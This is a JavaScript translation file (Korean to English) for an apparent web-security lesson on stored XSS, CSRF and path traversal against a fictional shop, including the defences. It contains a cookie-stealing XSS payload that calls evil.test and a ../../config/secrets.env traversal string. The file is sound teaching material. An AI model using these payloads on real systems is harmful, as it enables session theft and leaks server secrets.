// English for 8C.4 Web attacks. Korean (the page) → English. Rules: DESIGN.md "두 언어".
// 지우 is Jiwoo as in 8B.1; the shop is the course's stationery shop (shop.example.com).
window.lessonText = {
  // Page
  '웹 공격 · 레슨 8C.4': 'Web attacks · Lesson 8C.4', 
  '후기 칸의 스크립트가 다른 사람의 브라우저에서 실행되는 저장형 XSS와 이스케이프, 다른 사이트가 쿠키를 붙인 요청을 대신 보내게 하는 CSRF와 SameSite·토큰, 파일 이름의 ../로 폴더 밖을 읽는 경로 조작을 따라가 보세요.':
    'Follow stored XSS, where a script in a review box runs in other people\'s browsers, and escaping; CSRF, where another site gets your browser to send a request with your cookie, and SameSite and tokens; and path traversal, where ../ in a file name reads outside the folder.',
  '입력 한 줄이 어떻게 서버나 다른 사용자를 공격할까요? 문구점의 후기, 포인트 보내기, 설명서 내려받기에서 일어나는 공격과 막는 방법을 따라가 보세요.':
    'How can one line of input attack a server or other users? Follow the attacks on the stationery shop\'s reviews, point transfers and manual downloads, and how to stop them.',
  '문구점을 노리는 요청': 'Requests aimed at the shop', '공격자, 사용자의 브라우저, 문구점 서버, 공격자 사이트 사이로 악성 입력과 요청이 오가는 장면': 'Malicious input and requests passing between an attacker, a user\'s browser, the shop server and the attacker\'s site',
  '공격자 쪽': 'Attacker side', '사용자 브라우저': 'User\'s browser', '문구점 서버': 'Shop server', '저장소': 'Storage', 
  '"다음 단계"를 누르면 패킷이 오갑니다.': 'Press "Next step" and the requests go back and forth.',
  '공격자': 'Attacker', '지우의 브라우저': 'Jiwoo\'s browser', '댓글 DB': 'Review DB',
  '공격자 → 문구점 서버': 'Attacker → shop server', '문구점 서버 → 댓글 DB': 'Shop server → review DB', '댓글 DB → 문구점 서버': 'Review DB → shop server', '문구점 서버 → 지우의 브라우저': 'Shop server → Jiwoo\'s browser',
  '지우의 브라우저 → evil.test': 'Jiwoo\'s browser → evil.test', '지우의 브라우저 → 문구점 서버': 'Jiwoo\'s browser → shop server', '지우의 브라우저 → 지우의 브라우저': 'Jiwoo\'s browser → itself',
  '문구점 서버 → /srv/config': 'Shop server → /srv/config', '문구점 서버 → /srv/manuals': 'Shop server → /srv/manuals',
  // Step 1
  '저장형 XSS': 'Stored XSS',
  '남이 넣은 스크립트가 내 브라우저에서 실행된다': 'A script someone else put in runs in your browser',
  '상품 후기 칸에 글 대신 <script>…</script>를 넣으면 어떻게 될까요? 서버가 받은 후기를 그대로 저장하고, 다른 사람이 상품 페이지를 열 때 그대로 HTML에 끼워 보내면, 지우의 브라우저는 그것을 문구점이 보낸 코드로 믿고 실행합니다. 스크립트는 지우의 화면을 바꾸거나, 지우인 척 요청을 보내거나, 쿠키를 빼낼 수 있습니다. 이것을 교차 사이트 스크립팅(XSS)이라 합니다.':
    'What happens if you put <script>…</script> in a product review box instead of text? If the server stores the review as it is and slots it straight into the HTML when someone else opens the product page, Jiwoo\'s browser trusts it as code from the shop and runs it. The script can change Jiwoo\'s screen, send requests pretending to be Jiwoo, or take cookies. This is called cross-site scripting (XSS).',
  '공격자의 후기가 DB에 저장됐다가 지우의 화면에서 실행되어 evil.test로 정보를 보냈습니다. 6.12처럼 세션 쿠키에 HttpOnly를 붙였다면 스크립트가 쿠키를 읽지는 못하지만, 화면 안에서 지우인 척 요청을 보내는 것은 여전히 가능합니다.':
    'The attacker\'s review was stored in the DB, then ran on Jiwoo\'s screen and sent information to evil.test. With HttpOnly on the session cookie as in 6.12, the script cannot read the cookie, but it can still send requests from the page pretending to be Jiwoo.',
  '왼쪽 위에 공격자, 왼쪽 아래에 지우의 브라우저, 가운데 문구점 서버, 오른쪽에 댓글 DB, 가운데 아래에 공격자의 사이트 evil.test가 있습니다.': 'The attacker is top left, Jiwoo\'s browser bottom left, the shop server in the middle, the review DB on the right, and the attacker\'s site evil.test bottom middle.',
  '공격자의 후기': 'The attacker\'s review', '좋아요! <script>fetch("https://evil.test/?c=" + document.cookie)</script>': 'Great! <script>fetch("https://evil.test/?c=" + document.cookie)</script>',
  '후기 작성': 'Writing review', '로그인됨': 'Logged in',
  '후기 + <script>': 'Review + <script>', '후기 올리기': 'Posting the review', '서버는 내용을 확인하지 않음': 'the server does not check the content', '공격자가 스크립트가 든 후기를 올립니다.': 'The attacker posts a review with a script in it.', '받음': 'Received',
  '그대로 저장': 'Stored as is', '저장': 'Storing', 'reviews 표에 그대로 저장': 'stored as is in the reviews table', '후기가 그대로 저장됩니다.': 'The review is stored as it is.', '<script> 저장됨': '<script> stored',
  '상품 페이지': 'Product page', '지우가 상품을 봄': 'Jiwoo views the product', '<div class="review">좋아요! <script>…</script></div>': '<div class="review">Great! <script>…</script></div>',
  '브라우저: 문구점이 보낸 코드로 믿고 실행': 'browser: trusts it as code from the shop and runs it', '지우의 브라우저가 공격자의 스크립트를 실행합니다.': 'Jiwoo\'s browser runs the attacker\'s script.', '스크립트 실행': 'Script runs',
  '지우의 브라우저가 공격자의 스크립트를 실행한 까닭은?': 'Why did Jiwoo\'s browser run the attacker\'s script?',
  '문구점 페이지 안에 코드로 들어 있어 문구점의 코드로 믿어서': 'It sat as code inside the shop\'s page, so the browser trusted it as the shop\'s code', '지우가 직접 실행 버튼을 눌러서': 'Jiwoo pressed a run button',
  '브라우저는 페이지의 어느 부분이 사용자가 쓴 글인지 모릅니다. 서버가 글을 코드처럼 끼워 보낸 것이 문제입니다.': 'The browser cannot tell which part of a page a user wrote. The problem is that the server slotted text in as if it were code.',
  '정보 전송': 'Sending data', '정보가 새어 나감': 'Information leaks out', '지우의 화면 정보가 evil.test로 감': 'information from Jiwoo\'s screen goes to evil.test', '(HttpOnly 쿠키는 읽히지 않음 · 6.12)': '(HttpOnly cookies cannot be read · 6.12)',
  '스크립트가 정보를 공격자 사이트로 보냅니다.': 'The script sends information to the attacker\'s site.', '정보 받음': 'Got data',
  // Step 2
  '글은 글로': 'Text stays text',
  '출력할 때 특수 문자를 바꿔 글은 글로만 보이게 한다': 'Replace special characters on output so text only ever shows as text',
  'XSS를 막는 핵심은 사용자가 쓴 내용을 HTML에 넣을 때 특수 문자를 바꾸는 것(이스케이프)입니다. < 는 &lt;, > 는 &gt;로 바꾸면 브라우저는 그것을 태그가 아니라 글자로 보여 줍니다. 6.12의 SQL 인젝션 방어(입력은 값으로만)와 같은 생각입니다. 여기에 "이 사이트의 스크립트만 실행하라"는 규칙(콘텐츠 보안 정책)을 더하면 이중으로 막습니다.':
    'The key to stopping XSS is replacing special characters when putting user-written content into HTML (escaping). Turn < into &lt; and > into &gt;, and the browser shows them as characters, not tags. It is the same idea as the SQL injection defense in 6.12 (input only as values). Add a rule that says "run only this site\'s scripts" (a content security policy) for a second layer.',
  '같은 후기가 이번에는 "<script>…"라는 글자 그대로 화면에 보였고 실행되지 않았습니다. 요즘 화면 프레임워크는 기본으로 이스케이프하지만, 직접 HTML을 끼워 넣는 기능(innerHTML 등)을 쓰면 다시 위험해집니다.':
    'This time the same review showed on screen as the literal characters "<script>…" and did not run. Modern UI frameworks escape by default, but using features that insert HTML directly (innerHTML and the like) makes it dangerous again.',
  '같은 장면입니다. 이번에는 서버가 후기를 출력할 때 이스케이프합니다.': 'The same scene. This time the server escapes the review on output.',
  '저장된 후기 (같음)': 'The stored review (the same)', '좋아요! <script>fetch(…)</script>': 'Great! <script>fetch(…)</script>',
  '후기 읽기': 'Read review', '후기 꺼내기': 'Fetching the review', '저장된 후기를 꺼냄': 'takes out the stored review', '서버가 후기를 꺼냅니다.': 'The server takes out the review.', '이스케이프': 'Escaping',
  '이스케이프된 HTML': 'Escaped HTML', '글자로 바꿔 보냄': 'Sent as characters', '좋아요! &lt;script&gt;fetch(…)&lt;/script&gt;': 'Great! &lt;script&gt;fetch(…)&lt;/script&gt;',
  '화면: 좋아요! <script>fetch(…)</script> (그냥 글자)': 'screen: Great! <script>fetch(…)</script> (just characters)', '특수 문자를 바꿔 보내 글자로만 보입니다.': 'The special characters are replaced, so it shows only as characters.', '글자로 보임': 'Shown as text',
  '< 를 &lt; 로 바꾸면 브라우저는?': 'When < is turned into &lt;, the browser…', '"<" 글자를 화면에 보여 주기만 한다': 'Just shows the "<" character on screen', '태그로 해석해 실행한다': 'Reads it as a tag and runs it',
  '&lt;는 "글자 <를 보여 줘"라는 뜻이라 태그가 시작되지 않습니다.': '&lt; means "show the character <", so no tag begins.',
  '보안 정책': 'Security policy', '이중 안전장치': 'A second safeguard', '→ 혹시 끼어든 다른 출처 스크립트도 실행 안 함': '→ even a script from another origin that slips in will not run',
  '콘텐츠 보안 정책으로 한 번 더 막습니다.': 'A content security policy blocks it once more.', '안전': 'Safe',
  // Step 3
  '사이트 간 요청 위조': 'Cross-site request forgery',
  '다른 사이트가 내 쿠키를 붙인 요청을 대신 보내게 한다': 'Another site gets your browser to send a request with your cookie',
  '지우가 문구점에 로그인한 채로, 문자로 온 링크의 evil.test 페이지를 열었습니다. 그 페이지에는 문구점의 "포인트 보내기" 주소로 자동 제출되는 숨은 양식이 있습니다. 브라우저는 문구점으로 가는 요청에 문구점 쿠키를 자동으로 붙이므로, 서버는 지우가 직접 보낸 요청으로 압니다. 이것이 사이트 간 요청 위조(CSRF)입니다.':
    'While logged in to the shop, Jiwoo opened an evil.test page from a link in a text message. That page has a hidden form that submits itself to the shop\'s "send points" address. The browser automatically attaches the shop\'s cookie to requests going to the shop, so the server takes it as a request Jiwoo sent. This is cross-site request forgery (CSRF).',
  '지우는 아무것도 누르지 않았는데 포인트 1만 점이 공격자에게 갔습니다. 쿠키에 SameSite를 붙여 다른 사이트에서 시작된 요청에는 쿠키를 보내지 않게 하거나, 페이지마다 숨은 확인 값(CSRF 토큰)을 넣어 막습니다.':
    'Jiwoo pressed nothing, yet 10,000 points went to the attacker. It is stopped by marking the cookie SameSite so it is not sent on requests started from another site, or by putting a hidden check value (a CSRF token) in every page.',
  '왼쪽에 지우의 브라우저, 위에 evil.test, 오른쪽에 문구점 서버가 있습니다.': 'Jiwoo\'s browser is on the left, evil.test above, and the shop server on the right.',
  '지금 상태': 'Where things stand', '지우: 문구점에 로그인됨 (쿠키 있음)': 'Jiwoo: logged in to the shop (has a cookie)', '문자: "이벤트 당첨! https://evil.test/gift"': 'text message: "You won a prize! https://evil.test/gift"', '쿠키 있음': 'Has cookie',
  '링크 열기': 'Open link', 'evil.test 열기': 'Opening evil.test', '</form> + 자동 제출': '</form> + auto-submit',
  '지우가 링크를 엽니다. 숨은 양식이 있습니다.': 'Jiwoo opens the link. There is a hidden form.', '숨은 양식': 'Hidden form',
  'POST + 쿠키': 'POST + cookie', '쿠키가 붙은 요청': 'A request with the cookie', '브라우저가 문구점 쿠키를 자동으로 붙여 보냄': 'the browser automatically attaches the shop cookie', '서버: 지우의 요청으로 보고 처리': 'server: takes it as Jiwoo\'s request and processes it',
  '브라우저가 쿠키를 붙여 보내 서버가 속습니다.': 'The browser sends it with the cookie, and the server is fooled.', '1만 점 보냄': 'Sent 10,000',
  '서버가 이 요청을 지우가 보낸 것으로 믿은 까닭은?': 'Why did the server believe Jiwoo sent this request?',
  '브라우저가 문구점 쿠키를 자동으로 붙여서': 'The browser attached the shop cookie automatically', '공격자가 지우의 비밀번호를 알아서': 'The attacker knew Jiwoo\'s password',
  '쿠키는 어느 페이지에서 시작된 요청이든 그 사이트로 가면 붙었습니다. 공격자는 비밀번호를 몰라도 됩니다.': 'The cookie was attached to any request going to that site, whatever page it started from. The attacker does not need the password.',
  'SameSite + 토큰': 'SameSite + token', '막는 방법': 'How to stop it',
  'Set-Cookie: session=…; SameSite=Lax → 다른 사이트에서 시작된 POST엔 쿠키 안 붙음': 'Set-Cookie: session=…; SameSite=Lax → no cookie on POSTs started from another site',
  '양식마다 숨은 CSRF 토큰 → evil.test는 그 값을 모름': 'a hidden CSRF token in every form → evil.test does not know it', '→ 401 또는 403 (6.12)': '→ 401 or 403 (6.12)',
  'SameSite 쿠키와 CSRF 토큰으로 막습니다.': 'SameSite cookies and CSRF tokens stop it.', '거절': 'Refused',
  // Step 4
  '경로 조작': 'Path traversal',
  '파일 이름에 ../를 넣어 허락되지 않은 파일을 읽는다': 'Putting ../ in a file name reads a file that was not allowed',
  '문구점은 상품 설명서를 /files?name=pencil.pdf처럼 내려받게 합니다. 서버가 "설명서 폴더 + 이름"으로 파일을 열면, 이름에 ../(한 단계 위 폴더, 5.5)를 넣어 폴더 밖으로 나갈 수 있습니다. ../../config/secrets.env를 요청하면 서버의 비밀 설정 파일이 내려받아집니다.':
    'The shop lets you download product manuals like /files?name=pencil.pdf. If the server opens the file as "manuals folder + name", putting ../ (the folder one level up, 5.5) in the name gets outside the folder. Request ../../config/secrets.env and the server\'s secret settings file is downloaded.',
  '폴더를 벗어난 요청으로 비밀 설정이 새어 나갔습니다. 이름을 실제 경로로 풀어 설명서 폴더 안인지 확인하고, 가능하면 허락된 이름 목록에서만 고르게 합니다. 사용자 입력은 언제나 값으로만, 범위를 확인하고 쓰는 것이 웹 보안의 공통 원칙입니다.':
    'A request that escaped the folder leaked the secret settings. Resolve the name to its real path and check it is inside the manuals folder, and where possible pick only from a list of allowed names. Using user input only as values, and only after checking its range, is a common rule of web security.',
  '왼쪽에 공격자, 가운데 문구점 서버, 오른쪽 위에 설명서 폴더, 오른쪽 아래에 비밀 설정 파일이 있습니다.': 'The attacker is on the left, the shop server in the middle, the manuals folder top right and the secret settings file bottom right.',
  '서버 코드': 'Server code',
  '정상 요청': 'A normal request', '정상 요청은 설명서 폴더의 파일을 엽니다.': 'A normal request opens a file in the manuals folder.', '정상': 'Normal',
  '조작된 이름': 'A tampered name', '이름에 ../를 넣어 폴더 밖을 가리킵니다.': 'Putting ../ in the name points outside the folder.', '경로 풀기': 'Resolving path',
  '"/srv/manuals/../config/secrets.env"가 실제로 가리키는 곳은?': 'Where does "/srv/manuals/../config/secrets.env" really point?',
  '..는 한 단계 위 폴더입니다. manuals에서 한 단계 올라가 config로 들어갑니다.': '.. is the folder one level up. From manuals it goes up one level and into config.',
  '파일 열기': 'Open file', '비밀 파일 유출': 'The secret file leaks', 'DB 비밀번호, 결제 키가 든 파일을 내려보냄': 'sends down a file holding the DB password and payment keys',
  '비밀 설정 파일이 새어 나갑니다.': 'The secret settings file leaks out.', '유출됨': 'Leaked',
  '경로 확인': 'Check path', '실제 경로로 푼 뒤 /srv/manuals/ 안인지 확인 → 아니면 400': 'resolve to the real path and check it is inside /srv/manuals/ → otherwise 400',
  '또는 허락된 이름 목록에서만 고르기': 'or pick only from a list of allowed names', '실제 경로가 설명서 폴더 안인지 확인합니다.': 'Check the real path is inside the manuals folder.', '폴더 밖 거절': 'Outside refused',
  // Reading examples and example note
  '안 열림': 'Not opened',
  '문구점 서버 · 경로 확인': 'Shop server · check path', '지우의 브라우저 · SameSite + 토큰': 'Jiwoo\'s browser · SameSite + token', '지우의 브라우저 · 보안 정책': 'Jiwoo\'s browser · security policy', '지우의 브라우저 · 정보 전송': 'Jiwoo\'s browser · sending data',
  '후기에 <script>가 섞여 저장됨': 'a review with <script> is stored', '브라우저가 코드로 실행': 'the browser runs it as code', '쿠키가 evil.test로': 'the cookie goes to evil.test', '출력할 때 < >를 &lt; &gt;로': 'on output < > become &lt; &gt;', '브라우저가 글자로 봄': 'the browser sees plain text', '후기 내용만 보임': 'only the review text shows', 'evil.test가 쿠키 붙은 결제 POST': 'evil.test sends a payment POST with the cookie', '서버가 토큰을 확인': 'the server checks the token', '토큰 없어 거절': 'no token: refused', 'name=../config/secrets.env': 'name=../config/secrets.env', '풀린 경로가 /srv/manuals 밖': 'the resolved path is outside /srv/manuals', '폴더 밖이라 거절': 'outside the folder: refused', '공격자 후기의 <script>를 그대로 저장': 'attacker\'s <script> stored as is', '지우의 브라우저가 상품 페이지에서 실행': 'Jiwoo\'s browser runs it', '세션 정보가 evil.test로': 'session data to evil.test', '같은 후기를 출력할 때 이스케이프': 'escape the same review on output', '<script>가 글자로만 보임': '<script> shows as text only', '실행되지 않아 안전': 'not run: safe', 'evil.test의 숨은 양식이 쿠키 붙은 POST': 'evil.test POSTs with the cookie', '막지 않으면 1만 점이 나감': 'unguarded: 10,000 points lost', 'SameSite와 토큰이 있으면 거절': 'SameSite + token: refused', '경로를 풀면 /srv/manuals 밖': 'resolved, it leaves /srv/manuals', '확인 없으면 유출 · 확인하면 거절': 'no check: leaked · checked: refused',
};
